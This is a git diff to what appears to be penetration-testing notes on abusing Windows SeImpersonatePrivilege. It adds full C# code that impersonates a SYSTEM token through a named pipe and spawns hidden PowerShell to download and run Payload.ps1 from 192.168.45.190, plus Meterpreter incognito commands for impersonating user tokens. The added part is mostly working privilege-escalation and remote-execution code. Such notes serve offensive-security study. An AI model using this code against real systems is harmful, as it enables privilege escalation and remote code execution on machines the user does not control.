@@ -11,6 +11,8 @@ tags:
   - access
   - tokens
   - token
+  - meterpreter
+  - incognito
 ---
 
 ## SeImpersonatePrivilege
@@ -165,6 +167,111 @@ impersonate the token. Invoke the following:
 ```
 
 After a couple of seconds, `Pwn.exe` should report the SID of SYSTEM!
+
+#### Popping a shell
+
+The following C# .NET code will impersonate a SYSTEM token and use it to create
+a new process, executing an arbitrary command:
+
+```csharp
+namespace Pwn;
+
+class Program
+{
+    public const uint SECURITY_SQOS_PRESENT = 0x00100000;
+    public const uint SECURITY_IMPERSONATION = 2 << 16;
+    public const uint SECURITY_DELEGATION = 3 << 16;
+    public const uint TOKEN_ALL_ACCESS = 0xF01FF;
+
+    static void Main(string[] args)
+    {
+        if (args.Length == 0)
+        {
+            Console.WriteLine("Usage: Pwn.exe pipename");
+            return;
+        }
+
+        string pipeName = args[0];
+
+        // create a file for the named pipe
+        Pinvoke.CreateFile(
+            pipeName,
+            FileAccess.Read,
+            0,
+            IntPtr.Zero,
+            FileMode.Open,
+            SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION |
+                SECURITY_DELEGATION,
+            IntPtr.Zero
+        );
+
+        // create a named pipe and block for inbound connections
+        IntPtr hPipe = Pinvoke.CreateNamedPipe(
+            pipeName,
+            3,
+            0,
+            255,
+            0x1000,
+            0x1000,
+            0,
+            IntPtr.Zero
+        );
+
+        // wait for incoming pipe client
+        Pinvoke.ConnectNamedPipe(hPipe, IntPtr.Zero);
+
+        // impersonate pipe client's access token
+        Pinvoke.ImpersonateNamedPipeClient(hPipe);
+
+        // get a handle to this thread's access token
+        Pinvoke.OpenThreadToken(
+            Pinvoke.GetCurrentThread(),
+            TOKEN_ALL_ACCESS,
+            false,
+            out IntPtr hToken
+        );
+
+        // duplicate access token
+        Pinvoke.DuplicateTokenEx(
+            hToken,
+            TOKEN_ALL_ACCESS,
+            IntPtr.Zero,
+            2,
+            1,
+            out IntPtr hSystemToken
+        );
+
+        // create new process
+        Pinvoke.STARTUPINFO startupInfo = new(
+        ) { dwFlags = (int)Pinvoke.STARTF.STARTF_USESHOWWINDOW,
+            wShowWindow = (short)Pinvoke.SHOWWINDOW.SW_HIDE };
+
+        Pinvoke.CreateProcessWithTokenW(
+            hSystemToken,
+            0,
+            null,
+            "powershell -Command \"(Invoke-RestMethod -Uri 'http://192.168.45.190:80/Payload.ps1' -UseBasicParsing) | Invoke-Expression\"",
+            (uint)Pinvoke.CreateProcessFlags.CREATE_NO_WINDOW,
+            IntPtr.Zero,
+            null,
+            ref startupInfo,
+            out Pinvoke.PROCESS_INFORMATION _
+        );
+    }
+}
+```
+
+## Meterpreter incognito
+
+With a SYSTEM level **meterpreter** agent, we can use the **incognito** module
+to impersonate users' tokens. Here are some example invocations:
+
+```bash
+load incognito # load the module
+list_tokens -u # list tokens available
+impersonate_token ${DOMAIN}\\${USERNAME} # impersonate a user
+getuid # verify you pwned that user
+```
 
 ## Related pages
 
